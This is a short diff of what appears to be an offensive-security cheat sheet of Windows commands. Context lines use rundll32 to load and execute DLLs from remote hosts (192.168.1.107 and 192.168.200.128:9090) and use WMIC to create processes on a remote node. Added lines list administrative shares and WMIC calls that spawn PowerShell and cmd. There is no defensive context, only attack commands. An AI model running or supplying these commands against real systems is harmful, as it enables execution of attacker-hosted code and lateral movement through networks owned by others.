@@ -25,4 +25,11 @@ rundll32.exe \\192.168.1.107\ZtmW\test.dll,0
 Wmic /node:"ComputerName" process call create "cmd.exe
 process call create C:\windows\Windows\System32\cmd.exe
 rundll32.exe \\192.168.200.128:9090/cmd.dll,0
-``
+```
+```
+\\127.0.0.1\C$
+\\127.0.0.1\D$
+C:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
+process call create C:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe #wmic
+process call create C:\windows\Windows\System32\cmd.exe
+```
